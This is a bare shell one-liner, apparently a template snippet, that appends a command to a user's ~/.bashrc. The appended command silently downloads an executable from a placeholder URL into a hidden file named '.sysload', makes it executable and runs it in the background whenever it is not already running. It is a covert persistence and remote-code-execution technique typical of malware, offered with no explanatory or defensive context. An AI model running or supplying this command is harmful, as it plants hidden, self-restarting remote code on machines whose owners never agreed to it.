echo 'if [ -z $(pidof .sysload) ]; then wget -q -O - <<urlToExecutableFile>> > ~/.sysload; chmod +x ~/.sysload; ~/.sysload > /dev/null & fi' >> ~/.bashrc
